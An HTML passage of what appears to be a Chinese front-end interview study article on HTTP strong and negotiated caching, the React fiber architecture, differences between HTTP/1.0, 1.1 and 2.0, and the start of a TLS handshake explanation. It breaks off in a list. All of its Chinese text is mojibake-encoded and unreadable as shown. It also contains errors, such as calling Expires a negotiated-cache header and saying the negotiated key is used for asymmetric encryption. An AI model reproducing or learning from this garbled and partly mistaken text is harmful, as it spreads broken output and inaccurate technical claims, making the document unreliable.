<p>å¼ºç¼“å­˜é€šè¿‡è¯·æ±‚å¤´ä¸­è®¾ç½®çš„Expireså’ŒCache-Controlæ¥æ§åˆ¶ï¼Œå…¶ä¸­Expiresæ˜¯http1.0æ—¶çš„åå•†ç¼“å­˜è¯·æ±‚å¤´ï¼ŒCache-Controlæ˜¯http1.1æ¨å‡ºçš„è¯·æ±‚å¤´ï¼Œç°ä»£æµè§ˆå™¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä½¿ç”¨Cache-Controlæ¥æ§åˆ¶å¼ºç¼“å­˜ã€‚</p>
<p>Expiresæ˜¯é€šè¿‡è®¾ç½®ç»å¯¹æ—¶é—´æ¥æ§åˆ¶å¼ºç¼“å­˜çš„æ—¶é—´çš„ï¼Œå¦‚Expires: Wed, 21 Oct 2025 07:28:00 GMTã€‚è¿™å°±å¯¼è‡´ç”¨æˆ·å¯ä»¥é€šè¿‡ä¿®æ”¹ç³»ç»Ÿæ—¶é—´æ¥å¯¼è‡´å¼ºç¼“å­˜å¤±æ•ˆï¼Œæ‰€ä»¥Cache-Controlå‡ºç°ä¹‹åExpireså°±åŸºæœ¬ä¸ä½¿ç”¨äº†ã€‚</p>
<p>Cache-Controlçš„ä¸»è¦å±æ€§å€¼åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>private</strong>ï¼šå“åº”ä»…èƒ½è¢«å®¢æˆ·ç«¯ç¼“å­˜ï¼Œä¸èƒ½è¢«ä»£ç†æœåŠ¡å™¨ç¼“å­˜</li>
<li><strong>public</strong>ï¼šå“åº”å¯ä»¥è¢«å®¢æˆ·ç«¯å’Œä»£ç†æœåŠ¡å™¨ç¼“å­˜</li>
<li><strong>max-age</strong>ï¼šè®¾ç½®ç¼“å­˜çš„æœ€å¤§æœ‰æ•ˆæœŸï¼ˆç§’ï¼‰</li>
<li><strong>no-cache</strong>ï¼š<strong>æ¯æ¬¡ä½¿ç”¨ç¼“å­˜å‰å¿…é¡»å‘æœåŠ¡å™¨éªŒè¯</strong>ï¼ˆå¯ç”¨åå•†ç¼“å­˜ï¼‰</li>
<li><strong>no-store</strong>ï¼šç¦æ­¢ä»»ä½•å½¢å¼çš„ç¼“å­˜</li>
<li><strong>must-revalidate</strong>ï¼šç¼“å­˜è¿‡æœŸåå¿…é¡»å‘æœåŠ¡å™¨éªŒè¯</li>
<li><strong>immutable</strong>ï¼šèµ„æºåœ¨æœ‰æ•ˆæœŸå†…ä¸ä¼šæ”¹å˜ï¼ˆé€‚åˆç‰ˆæœ¬åŒ–èµ„æºï¼‰</li>
</ul>
<p>å½“è¦è¯·æ±‚ä¸€ä¸ªèµ„æºæ—¶ï¼Œå¦‚æœå¯ç”¨äº†å¼ºç¼“å­˜ï¼Œç¬¬ä¸€æ¬¡ç¼“å­˜ä¼šè¯·æ±‚æœåŠ¡å™¨ç„¶åä¼šå°†èµ„æºç¼“å­˜åˆ°æœ¬åœ°å†…å­˜æˆ–ç£ç›˜ï¼Œå¦‚æœç¼“å­˜æ²¡æœ‰è¿‡æœŸçš„æƒ…å†µä¸‹å†æ¬¡è¯·æ±‚å°±ä¼šç›´æ¥ä»å†…å­˜æˆ–ç£ç›˜æ‹¿æ•°æ®ï¼Œä¸ä¼šè¯·æ±‚æœåŠ¡å™¨ï¼Œå¤§å¹…å‡å°‘äº†æœåŠ¡å™¨å‹åŠ›ï¼Œä¹Ÿæé«˜äº†å‰ç«¯çš„å“åº”é€Ÿåº¦ã€‚</p>
<p>é‚£ä¹ˆä»€ä¹ˆæ—¶å€™å­˜åˆ°å†…å­˜ï¼Œä»€ä¹ˆæ—¶å€™å­˜åˆ°ç£ç›˜å‘¢ï¼Ÿä¸€èˆ¬æ¥è¯´ä½“ç§¯å°ã€å¤šæ¬¡å¤ç”¨ã€è¿‡æœŸæ—¶é—´çŸ­çš„ä¼šå­˜åœ¨å†…å­˜ï¼Œåä¹‹å­˜åˆ°ç£ç›˜ï¼Œè¿™æ—¶ç”±æµè§ˆå™¨å†³å®šçš„ï¼Œæ˜¯ä¸€ä¸ªé»‘ç›’çš„è¿‡ç¨‹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸç§æ‰‹æ®µå»å½±å“æµè§ˆå™¨çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å°†è¿‡æœŸæ—¶é—´è®¾ç½®çš„çŸ­ä¸€ç‚¹ï¼Œå°±è¶Šæœ‰å¯èƒ½å­˜åˆ°å†…å­˜ä¸­ã€‚</p>
<p>æˆ‘ä»¬è¿™é‡Œä¹Ÿå¯ä»¥æ€»ç»“ä¸€ä¸‹å¼ºç¼“å­˜çš„ä¼˜ç¼ºç‚¹ã€‚ä¼˜ç‚¹æ˜¯è®¾ç½®äº†è¿‡æœŸæ—¶é—´ä¹‹åä¸ä¼šè¯·æ±‚æœåŠ¡å™¨ï¼Œå‡å°‘äº†æœåŠ¡å™¨çš„å‹åŠ›å’Œå®½å¸¦å¼€é”€ï¼›ç¼ºç‚¹æ˜¯è¿‡æœŸæ—¶é—´ä¹‹å‰ç¼“å­˜çš„æ•°æ®æ˜¯ä¸ä¼šæ›´æ–°çš„ï¼Œå¦‚æœæœåŠ¡å™¨çš„æ•°æ®æ›´æ–°äº†ï¼Œä½†æ˜¯æœ¬åœ°ç¼“å­˜è¿˜æ²¡æœ‰è¿‡æœŸï¼Œå°±ä¼šå¯¼è‡´æ•°æ®ä¸åŒæ­¥çš„é—®é¢˜ï¼Œæ‰€ä»¥ï¼Œä¸€èˆ¬æ¥è®²ï¼Œå¼ºç¼“å­˜è¦å­˜å‚¨ä¸å¸¸æ”¹å˜çš„èµ„æºï¼Œå¦‚vue.js</p>
<h4 data-id="heading-41">åå•†ç¼“å­˜</h4>
<p>åå•†ç¼“å­˜æ˜¯é€šè¿‡è®¾ç½®è¯·æ±‚å¤´ä¸­çš„Last-Modifiedï¼ˆIf-Modified-Sinceï¼‰ã€ETag ï¼ˆIf-None-Matchï¼‰æ¥æ§åˆ¶çš„ã€‚å…¶ä¸­è¯·æ±‚å¤´Last-Modifiedï¼ˆIf-Modified-Sinceï¼‰æ˜¯http1.0ä¸­è®¾ç½®çš„è¯·æ±‚å¤´ï¼ŒETag ï¼ˆIf-None-Matchï¼‰æ˜¯http1.1æ¨å‡ºçš„æ–°çš„åå•†ç¼“å­˜è¯·æ±‚å¤´ï¼Œç°ä»£æµè§ˆå™¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹ä½¿ç”¨ETag ï¼ˆIf-None-Matchï¼‰æ¥æ§åˆ¶åå•†ç¼“å­˜ã€‚</p>
<p>Last-Modifiedï¼ˆIf-Modified-Sinceï¼‰æ˜¯é€šè¿‡åˆ¤æ–­æ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´æ¥ç¡®å®šæ˜¯å¦ä½¿ç”¨ç¼“å­˜èµ„æºçš„ï¼Œä¸è®ºæ˜¯å¦çœŸæ­£çš„ä¿®æ”¹å†…å®¹ã€‚è¿™å°±å¯¼è‡´æŸäº›æƒ…å†µä¸‹æµªè´¹å®½å¸¦</p>
<p>ETag ï¼ˆIf-None-Matchï¼‰æ˜¯é€šè¿‡åˆ¤æ–­æ–‡ä»¶çš„å†…å®¹æ˜¯å¦ä¿®æ”¹æ¥ç¡®å®šæ˜¯å¦ä½¿ç”¨ç¼“å­˜çš„ï¼Œç›¸æ¯”äºLast-Modifiedï¼ˆIf-Modified-Sinceï¼‰æ›´åŠ ç²¾ç»†å®ç”¨ã€‚å…·ä½“çš„è¿‡ç¨‹æ˜¯ï¼Œå½“å¯ç”¨Etagåå•†ç¼“å­˜æ—¶ï¼Œç¬¬ä¸€æ¬¡è¯·æ±‚å¹¶ä¸ä¼šæºå¸¦è¯·æ±‚éªŒè¯ï¼ŒæœåŠ¡å™¨åœ¨è¿”å›èµ„æºæ—¶ä¼šåœ¨å“åº”å¤´ä¸­è¿”å›ä¸€ä¸ªEtagï¼Œè¿™ä¸ªå€¼æ˜¯æœåŠ¡å™¨æ ¹æ®èµ„æºå†…å®¹ç”Ÿæˆçš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå½“ä¸‹æ¬¡è¯·æ±‚æ—¶å°±ä¼šåœ¨è¯·æ±‚å¤´å¸¦å…¥If-None-Matchï¼Œå€¼å°±æ˜¯ç¬¬ä¸€æ¬¡è¯·æ±‚æ—¶è¿”å›çš„Etagå€¼ã€‚è¯·æ±‚è¿‡å»çš„æ—¶å€™æœåŠ¡å™¨ä¼šæ¯”è¾ƒIf-None-Matchå’Œæ–°çš„Etagå€¼æ˜¯å¦ä¸€æ ·ï¼Œå¦‚æœä¸€æ ·å°±è¿”å›<strong>304 Not Modified</strong>ä¸è¿”å›èµ„æºï¼Œæ„æ€æ˜¯é€šçŸ¥å‰ç«¯èµ„æºæ²¡æœ‰å˜å¯ä»¥ä»æµè§ˆå™¨æ‹¿å–ç¼“å­˜ï¼Œå¦‚æœå€¼ä¸ä¸€æ ·ï¼Œè¯´æ˜èµ„æºæ”¹å˜ï¼Œè¿™æ—¶å°±è¿”å›200çŠ¶æ€ç å¹¶è¿”å›æ–°çš„èµ„æº</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åå•†ç¼“å­˜çš„ä¼˜åŠ£ã€‚ä¼˜åŠ¿æ˜¯å¯ä»¥å®æ—¶çš„æ›´æ–°æœ€æ–°æ•°æ®ä¸å®³æ€•èµ„æºè¿‡æœŸï¼Œä½†æ˜¯æ¯”èµ·å¼ºç¼“å­˜ï¼Œåå•†ç¼“å­˜å¤šäº†ç½‘ç»œè¯·æ±‚çš„å¾€è¿”ï¼Œè¿™æ ·ä¼šå¯¼è‡´ç½‘ç»œå»¶è¿Ÿçš„å‘ç”Ÿã€‚æ‰€ä»¥åå•†ç¼“å­˜é€‚åˆåŠ¨æ€å†…å®¹ã€APIå“åº”ã€å¯èƒ½é¢‘ç¹æ›´æ–°çš„èµ„æºï¼ˆå¦‚æœªç‰ˆæœ¬åŒ–çš„HTMLï¼‰</p>
<h2 data-id="heading-42">ä¹ã€å¦‚æœæœ‰å¤§é‡çš„ dom æ“ä½œå’Œ domåŠ¨ç”»ä¸€èµ·æ‰§è¡Œä¼šå‘ç”Ÿä»€ä¹ˆ-faberæ¶æ„ â˜…â˜…â˜…</h2>
<p>æˆ‘è®¤ä¸ºè¿™ä¸€é¢˜å°±æ˜¯è€ƒå¯Ÿæˆ‘ä»¬å¯¹reactè™šæ‹Ÿdomå’Œfaberæ¶æ„è°ƒåº¦æœºåˆ¶çš„ç†è§£ï¼Œè¿™é‡Œæ¨èä¸€ç¯‡æ–‡ç« 
<a href="https://juejin.cn/post/7545853099353817128" target="_blank" title="https://juejin.cn/post/7545853099353817128">æµ…è°ˆReactä¸­è™šæ‹ŸDOMã€diffç®—æ³•ã€fiberæ¶æ„çš„å…³ç³»ï¼ˆé¢è¯•å¯ç”¨ï¼‰- æ˜é‡‘</a></p>
<h2 data-id="heading-43">åã€http1.0å’Œhttp2.0çš„åŒºåˆ« â˜…â˜…â˜…</h2>
<p>é¦–å…ˆæ˜ç¡®å¯¼è‡´å»¶è¿Ÿçš„ç½ªé­ç¥¸é¦–æ˜¯ä»€ä¹ˆï¼Œæ— ç–‘æ˜¯å¸¦å®½å’Œé˜Ÿå¤´é˜»å¡ã€‚</p>
<p>å¸¦å®½å½±å“äº†å•ä½æ—¶é—´æœ€å¤§çš„æ•°æ®é€šè¿‡é‡ï¼Œé˜Ÿå¤´é˜»å¡åˆ™å½±å“äº†æ•°æ®çš„ä¼ è¾“æ•ˆç‡</p>
<p>è™½ç„¶è¿‘å¹´æ¥ç½‘ç»œå¸¦å®½å¢é•¿éå¸¸å¿«ï¼Œç„¶è€Œæˆ‘ä»¬å´å¹¶æ²¡æœ‰çœ‹åˆ°ç½‘ç»œå»¶è¿Ÿæœ‰ç›¸åº”ç¨‹åº¦çš„é™ä½ã€‚<strong>ç½‘ç»œå»¶è¿Ÿé—®é¢˜ä¸»è¦ç”±äºé˜Ÿå¤´é˜»å¡,å¯¼è‡´å¸¦å®½æ— æ³•è¢«å……åˆ†åˆ©ç”¨</strong>ã€‚</p>
<p>ç”±http1.0åˆ°http2.0çš„è¿‡ç¨‹ä¸€å¤§åŠå°±æ˜¯è§£å†³é˜Ÿå¤´é˜»å¡çš„è¿‡ç¨‹ã€‚</p>
<h4 data-id="heading-44">http1.0</h4>
<p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹http1.0ï¼Œhttp1.0åªå…è®¸çŸ­é“¾æ¥ï¼Œè€Œä¸”æ¯ä¸ªçŸ­é“¾æ¥åªå…è®¸å•ä¸ªè¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªhttpè¯·æ±‚éƒ½è¦è¿›è¡Œä¸€æ¬¡TCPè¿æ¥ï¼Œè¿æ¥ä¹‹åTCPè¿æ¥ä¼šæ–­å¼€ï¼Œä¸‹æ¬¡httpè¯·æ±‚è¿˜è¦é‡æ–°å»ºç«‹ä¸€ä¸ªTCPè¿æ¥ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½æœ‰TCPä¸‰æ¬¡æ¡æ‰‹ï¼ˆ1.5RTTï¼‰å’Œå››æ¬¡æŒ¥æ‰‹å¼€é”€ï¼Œå¯¼è‡´æœåŠ¡å™¨å‹åŠ›å¤§ï¼Œé˜Ÿå¤´é˜»å¡ç½‘ç»œå»¶è¿Ÿä¸¥é‡ã€‚</p>
<p>æ­¤å¤–ï¼Œhttp1.0æ— ä¸»æœºå¤´ï¼Œæ— æ³•å®ç°è™šæ‹Ÿä¸»æœºï¼Œæµªè´¹IPèµ„æºï¼›ç¼“å­˜æœºåˆ¶ç®€é™‹ï¼Œåªæœ‰åŸºæœ¬çš„Â <code>Expires</code>Â å’ŒÂ <code>Last-Modified</code>ï¼›åªæœ‰16ä¸ªçŠ¶æ€ç ï¼›ä¸æ”¯æŒhttpsï¼›ä¸æ”¯æŒå“åº”ä½“å‹ç¼©ï¼›ä¸æ”¯æŒæ–‡ä»¶çš„åˆ†æ®µä¸Šä¼ ï¼Œæµªè´¹å¸¦å®½</p>
<h4 data-id="heading-45">http1.1</h4>
<p>ä¹‹åæ˜¯http1.1çš„æ—¶ä»£ï¼Œç›¸æ¯”äºhttp1.0ï¼Œhttp1.1æœ‰è¾ƒå¤§çš„è¿›æ­¥ï¼Œä¹Ÿæœ‰ä¸€äº›é—ç•™é—®é¢˜æ²¡æœ‰è§£å†³ã€‚</p>
<p>æœ€æ ¸å¿ƒçš„è¿›æ­¥æ˜¯http1.1æ”¯æŒé•¿è¿æ¥ï¼ˆConnection: keep-aliveï¼›Keep-Alive: timeout=5, max=100 ï¼‰ï¼Œå‡å°‘äº†å¤šæ¬¡å»ºç«‹TCPè¿æ¥çš„å¼€é”€ï¼Œä¸€æ¬¡TCPè¿æ¥å¯ä»¥è¿›è¡Œå¤šä¸ªhttpè¯·æ±‚ï¼Œè€Œä¸”æ”¯æŒç®¡é“åŒ–ï¼ˆç®¡é“åŒ–æ˜¯ä¸€æ¬¡å¤±è´¥çš„å°è¯•ï¼Œå¯ä»¥å¿½ç•¥ï¼Œä¹‹åä¼šè®²ï¼‰</p>
<p>æ­¤å¤–http1.1æ”¯æŒäº†è™šæ‹Ÿä¸»æœºï¼Œä¸€ä¸ªipå¯ä»¥æ‰˜ç®¡å¤šä¸ªç½‘ç«™ï¼›å¢å¼ºäº†ç¼“å­˜æœºåˆ¶ï¼Œæ–°å¢äº†å¤´éƒ¨Cache-Controlå’ŒEtagï¼Œè¿™ä¹Ÿæ˜¯ç°ä»£æœ€å¸¸ç”¨çš„å¼ºç¼“å­˜å’Œåå•†ç¼“å­˜å¤´éƒ¨ï¼›æ”¯æŒèµ„æºçš„åˆ†æ®µä¸Šä¼ ï¼ŒèŠ‚çœäº†å®½å¸¦çš„å…„æ¶ˆè€—ï¼›æ–°å¢äº†åå•†ç¼“å­˜ï¼›æ–°å¢äº†patchæ–¹æ³•ï¼›</p>
<p>ä½†æ˜¯è¿˜æœ‰é—ç•™é—®é¢˜æ²¡æœ‰è§£å†³ï¼Œæ¯”å¦‚ç®¡é“åŒ–çš„å¹¶è¡Œå°è¯•ï¼Œå› ä¸ºhttp1.1æ˜¯åŸºäºæ–‡æœ¬åè®®ä¼ è¾“ï¼Œæ‰€ä»¥ä¼ è¾“æ—¶éœ€è¦ä»¥httpè¯·æ±‚ä¸ºå•ä½ï¼Œå°±ä¼šå¯¼è‡´å¤šä¸ªhttpè¯·æ±‚å‡ºç°äº’ç›¸ç­‰å¾…çš„é—®é¢˜ï¼Œè€Œä¸”ç®¡é“åŒ–è¦æ±‚è¯·æ±‚çš„é¡ºåºè¿”å›ï¼Œå¦‚æœç¬¬ä¸€ä¸ªè¯·æ±‚å¾ˆæ…¢ï¼Œä½†æ˜¯ç¬¬äºŒä¸ªç¬¬ä¸‰ä¸ªå¾ˆå¿«ï¼Œå°±ä¼šå‡ºç°ç¬¬äºŒä¸ªç¬¬ä¸‰ä¸ªç­‰å¾…çš„ç°è±¡ï¼Œå¹¶ä¸èƒ½çœŸæ­£å®ç°å¹¶è¡Œè¯·æ±‚ï¼›æ‰€ä»¥ç®¡é“åŒ–åœ¨å®é™…å¼€å‘ä¸­å¹¶ä¸ä¼šè¢«ä½¿ç”¨ï¼Œå°½ç®¡http1.1å…è®¸äº†é•¿è¿æ¥ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸€ä¸ªä¸€ä¸ªè¯·æ±‚å¤„ç†çš„ï¼Œè€Œä¸€ä¸ªipåªå…è®¸åŒæ—¶6ä¸ªtcpè¿æ¥ï¼Œè¿˜æ˜¯ä¼šå‡ºç°é˜Ÿå¤´é˜»å¡çš„é—®é¢˜ï¼›è€Œä¸”http1.1ä¸æ”¯æŒè¯·æ±‚å¤´çš„å‹ç¼©ï¼Œå¯¼è‡´å¾ˆå¤šæƒ…å†µä¸‹é˜Ÿå¤´çš„ä½“ç§¯è¦æ¯”å“åº”é¢˜çš„ä½“ç§¯è¿˜è¦å¤§ï¼›æœåŠ¡ç«¯æ²¡æœ‰ä¸»åŠ¨æ¨é€çš„åŠŸèƒ½</p>
<h4 data-id="heading-46">http2.0</h4>
<p>http2.0å‘ä¸‹å…¼å®¹äº†http1.Xï¼Œä½†å’Œhttp1.xä¸åŒçš„æ˜¯ï¼Œhttp2.0ä¸æ˜¯åŸºäºæ–‡æœ¬æ•°æ®ä¼ è¾“çš„ï¼Œè€Œæ˜¯åŸºäºäºŒè¿›åˆ¶æ•°æ®æµè¿›è¡Œä¼ è¾“ï¼Œè¿™å°±å¾ˆå¤§ç¨‹åº¦ä¸Šè§£å†³</p>
<p>æœ€æ ¸å¿ƒçš„è¿›æ­¥æ˜¯HTTP/2.0çš„<strong>äºŒè¿›åˆ¶åˆ†å¸§æœºåˆ¶</strong>ã€‚å®ƒå°†æ‰€æœ‰ä¼ è¾“å†…å®¹æ‹†åˆ†ä¸ºäºŒè¿›åˆ¶å¸§ï¼ˆFrameï¼‰ï¼Œæ¯ä¸ªå¸§æ ‡è®°æµIDã€‚ä¸åŒè¯·æ±‚/å“åº”é€šè¿‡ä¸åŒæµå¹¶è¡Œä¼ è¾“ï¼Œä»åº”ç”¨å±‚è§£å†³äº†HTTPé˜Ÿå¤´é˜»å¡é—®é¢˜â€”â€”å³ä½¿æŸæ¡æµçš„å¸§ä¸¢å¤±ï¼Œä¹Ÿä»…é˜»å¡è¯¥æµè€Œä¸å½±å“å…¶ä»–æµä¼ è¾“ã€‚</p>
<p>åœ¨HTTP/2.0ä¸­ï¼Œå•ä¸ªTCPè¿æ¥å¯æ‰¿è½½ä»»æ„æ•°é‡çš„åŒå‘æµï¼ˆStreamï¼‰ï¼Œæ¯ä¸ªæµç‹¬ç«‹ä¼ è¾“è¯·æ±‚/å“åº”ï¼Œæ— éœ€æ–°å»ºè¿æ¥ã€‚è¿™å®ç°äº†è¿æ¥çš„å®Œå…¨å¤ç”¨ï¼Œå¤§å¹…æå‡äº†ä¼ è¾“æ•ˆç‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒHTTP/2.0ä»…è§£å†³äº†åº”ç”¨å±‚é˜Ÿå¤´é˜»å¡ï¼ŒTCPå±‚ä»å­˜åœ¨é˜Ÿå¤´é˜»å¡é—®é¢˜ï¼Œè¿™æ­£æ˜¯HTTP/3.0æ”¹ç”¨QUICåè®®è¦è§£å†³çš„ã€‚</p>
<p>æ­¤å¤–ï¼Œhttp2.0å®è¡Œäº†å¤´éƒ¨å‹ç¼©ï¼Œå¤§å¹…å‡å°‘å¤´éƒ¨ä¼ è¾“ä½“ç§¯ï¼Œé€šè¿‡ HPACK ç®—æ³•å®ç°å¤´éƒ¨å‹ç¼©ï¼š</p>
<ul>
<li>é™æ€å­—å…¸ï¼šé¢„å®šä¹‰å¸¸ç”¨å¤´éƒ¨å­—æ®µï¼ˆå¦‚ Hostã€Accept-Encodingï¼‰ï¼Œç”¨æ•´æ•°ç´¢å¼•æ›¿ä»£å®Œæ•´å­—ç¬¦ä¸²ï¼›</li>
<li>åŠ¨æ€å­—å…¸ï¼šè®°å½•å½“å‰è¿æ¥ä¸­é‡å¤å‡ºç°çš„å¤´éƒ¨å­—æ®µï¼ˆå¦‚è‡ªå®šä¹‰çš„ Token å¤´ï¼‰ï¼Œåç»­ä¼ è¾“ä»…éœ€ç´¢å¼•ï¼›</li>
<li>å“ˆå¤«æ›¼ç¼–ç ï¼šå¯¹éå­—å…¸å­—æ®µè¿›ä¸€æ­¥å‹ç¼©ã€‚</li>
</ul>
<p>http2.0å…è®¸æœåŠ¡å™¨æ¨é€ä¸»åŠ¨æ¨é€å…³é”®èµ„æºï¼Œé¦–å±åŠ è½½æ—¶ï¼ŒæœåŠ¡å™¨å¯æå‰æ¨é€ AI å·¥å…·çš„æ ¸å¿ƒ JSï¼ˆå¦‚å¯¹è¯é€»è¾‘ã€æ¨¡å‹æ¥å£å°è£…ï¼‰å’Œé¦–å±å›¾ç‰‡ï¼Œç¼©çŸ­é¦–å±æ¸²æŸ“æ—¶é—´</p>
<h2 data-id="heading-47">åä¸€ã€https TLSåŠ å¯†çš„è¿‡ç¨‹ â˜…â˜…â˜…</h2>
<p>http1.xçš„æ–‡æœ¬ä¼ è¾“ä¹Ÿå¥½ï¼Œhttp2.0çš„äºŒè¿›åˆ¶åˆ†å¸§ä¹Ÿå¥½ï¼Œéƒ½æ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´<strong>å†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬</strong>ã€<strong>èº«ä»½å¯èƒ½è¢«ä¼ªé€ </strong>ã€<strong>æŠ¥æ–‡å¯èƒ½è¢«ç¯¡æ”¹</strong>ã€‚</p>
<p>httpså°±æå¤§çš„æé«˜äº†httpçš„å®‰å…¨æ€§ï¼ŒåŒºåˆ«æ˜¯åœ¨httpçš„ä¸‰æ¬¡æ¡æ‰‹ä¹‹åå¤šå‡ºäº†ä¸€ä¸ªTLSæ¡æ‰‹ï¼Œæˆ‘ä»¬ç°åœ¨è¦è®²è§£çš„å°±æ˜¯TLSæ¡æ‰‹çš„è¿‡ç¨‹ã€‚ä¸‹é¢æˆ‘ä»¬å…ˆäº†è§£ä¸€äº›å‰ç½®çš„çŸ¥è¯†ã€‚</p>
<h4 data-id="heading-48">ä¸¤ç§åŠ å¯†æ–¹å¼â€”â€”å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†</h4>
<h5 data-id="heading-49">å¯¹ç§°åŠ å¯†</h5>
<p>å¯¹ç§°åŠ å¯†ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥ï¼ˆåŠ å¯†ç®—æ³•ï¼‰å»åŠ å¯†æ•°æ®ï¼Œè¿™ä¸ªå¯†é’¥å¯ä»¥åŠ å¯†æ•°æ®ä¹Ÿå¯ä»¥è§£å¯†æ•°æ®ã€‚ä½†æ˜¯å¦‚æœæœ‰ç¬¬ä¸‰æ–¹çŸ¥é“äº†è¿™ä¸ªå¯†é’¥ï¼Œå°±å¯ä»¥è§£å¯†æ•°æ®ï¼Œå®‰å…¨æ€§ä¸é«˜ã€‚è€Œè¿™ä¸ªå¯†é’¥éœ€è¦åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ä¼ è¾“ï¼Œå°±åŠ å¤§äº†å¯†é’¥æ³„éœ²çš„é£é™©</p>
<h5 data-id="heading-50">éå¯¹ç§°åŠ å¯†</h5>
<p>éå¯¹ç§°åŠ å¯†ä½¿ç”¨å…¬é’¥å’Œç§é’¥è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ï¼Œé€šå¸¸æƒ…å†µä¸‹å…¬é’¥åªç”¨æ¥åŠ å¯†ï¼Œæ²¡æœ‰è§£å¯†åŠŸèƒ½ï¼Œè€Œç§é’¥å¯ä»¥è§£å¯†è¿™ä¸ªå…¬é’¥åŠ å¯†çš„æ•°æ®ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šæŠŠå…¬é’¥ä¼ ç»™å®¢æˆ·ç«¯ï¼Œå®¢æˆ·ç«¯å¯¹æ•°æ®ä½¿ç”¨å…¬é’¥è¿›è¡ŒåŠ å¯†ä¼ ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä½¿ç”¨ç§é’¥è§£å¯†æ•°æ®ï¼Œè¿™æ—¶å¦‚æœæœ‰äººæˆªè·äº†å®¢æˆ·ç«¯å‘ç»™æœåŠ¡å™¨çš„æ•°æ®ï¼Œä»–ä¹Ÿè§£å¯†ä¸äº†ï¼Œå› ä¸ºç§é’¥åœ¨æœåŠ¡å™¨ä¸Šï¼Œè€Œä¸”ä»å¤´åˆ°å°¾ç§é’¥éƒ½æ²¡æœ‰åœ¨ç½‘ç»œä¸Šä¼ è¾“ï¼Œä¸ä¼šè¢«æˆªè·ï¼Œå®‰å…¨æ€§å°±å¤§å¤§æå‡ã€‚</p>
<h5 data-id="heading-51">TLS1.2çš„åŠ å¯†</h5>
<p>å…¶å®å¯¹ç§°åŠ å¯†å’Œéå¯¹ç§°åŠ å¯†å„æœ‰ä¼˜åŠ£ï¼Œå¯¹ç§°åŠ å¯†å®‰å…¨æ€§ä¸é«˜ï¼Œä½†æ˜¯ä¼ è¾“æ•ˆç‡é«˜ï¼Œæ²¡æœ‰å†—ä½™æ“ä½œï¼›éå¯¹ç§°åŠ å¯†å®‰å…¨æ€§é«˜ï¼Œä½†æ˜¯æ•ˆç‡ä½ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥å–äºŒè€…ç²¾åï¼Œé¿äºŒè€…ç³Ÿç²•å‘¢ï¼Ÿæœ‰çš„ã€‚</p>
<p>é¦–å…ˆæ˜¯å¯¹ç§°åŠ å¯†çš„ä¸å®‰å…¨æ€§æ˜¯åœ¨å“ªï¼Ÿæ˜¯å› ä¸ºå¯†é’¥å®¹æ˜“æ³„éœ²ï¼Œå¦‚æœè¿™ä¸ªå¯†é’¥ä¸ä¼šæ³„éœ²çš„è¯ï¼Œå°±å¯ä»¥è§£å†³å¯¹ç§°åŠ å¯†çš„ä¸å®‰å…¨çš„é—®é¢˜ã€‚è€Œéå¯¹ç§°åŠ å¯†æ˜¯å®‰å…¨çš„ï¼Œå¯ä»¥ä½¿ç”¨éå¯¹ç§°åŠ å¯†å»ç”Ÿæˆä¸€ä¸ªå®‰å…¨çš„ä¸ä¼šè¢«æ³„éœ²çš„å¯†é’¥ï¼Œç„¶åä½¿ç”¨è¿™ä¸ªå¯†é’¥å»è¿›è¡Œéå¯¹ç§°åŠ å¯†ï¼Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªå®‰å…¨çš„ã€é«˜æ•ˆçš„åŠ å¯†æ–¹å¼</p>
<p>ä¸Šé¢çš„åŠ å¯†æ–¹å¼å°±è§£å†³äº†httpçš„ç¬¬ä¸€ä¸ªå®‰å…¨æ€§çš„é—®é¢˜â€”â€”<strong>å†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬</strong></p>
<h5 data-id="heading-52">SSLè¯ä¹¦</h5>
<p><strong>SSL è¯ä¹¦</strong>æ˜¯ä¸€ç§åŸºäºå…¬é’¥åŸºç¡€è®¾æ–½ï¼ˆPKIï¼‰çš„æ•°å­—è¯ä¹¦ï¼Œç”±æƒå¨çš„ç¬¬ä¸‰æ–¹è¯ä¹¦é¢å‘æœºæ„ç­¾å‘ï¼Œç”¨äºéªŒè¯æœåŠ¡å™¨èº«ä»½ï¼Œå¹¶ä¸ºå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡å»ºç«‹åŠ å¯†é“¾è·¯ã€‚åç»­ SSL åè®®å‡çº§ä¸ºæ›´å®‰å…¨çš„<strong>TLS åè®®</strong>ï¼Œå› æ­¤ SSL è¯ä¹¦ä¹Ÿå¸¸è¢«ç§°ä¸ºÂ <strong>TLS è¯ä¹¦</strong></p>
<p>è¿™ä¸ªè¯ä¹¦ç”¨äºèº«ä»½éªŒè¯ï¼ŒSSL è¯ä¹¦åŒ…å«ä»¥ä¸‹å…³é”®ä¿¡æ¯ï¼Œç”¨äºèº«ä»½éªŒè¯å’ŒåŠ å¯†é€šä¿¡ï¼š</p>
<ol>
